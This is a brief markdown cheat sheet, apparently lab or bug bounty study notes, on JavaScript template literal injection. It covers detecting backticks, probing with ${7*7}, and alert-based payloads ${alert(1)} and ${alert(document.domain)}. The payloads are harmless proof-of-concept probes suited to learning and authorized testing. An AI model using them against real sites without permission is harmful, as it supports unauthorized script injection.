# Template Literal CheatSheet

## Detection

Look for:

```javascript
`
`
```

(backticks)

---

# Example

```javascript
var msg = `USER_INPUT`;
```

---

# Verification Payload

```javascript
${7*7}
```

---

Expected Output

```text
49
```

---

# Exploitation Payload

```javascript
${alert(1)}
```

---

# Alternative Payload

```javascript
${alert(document.domain)}
```

---

# Execution Flow

```text
Template Literal
        ↓
Expression Evaluation
        ↓
Execution
```

---

# Related Lab

```text
Lab23
```

---

# Bug Bounty Reminder

Whenever you see:

```javascript
`
`
```

test:

```javascript
${7*7}
```

immediately.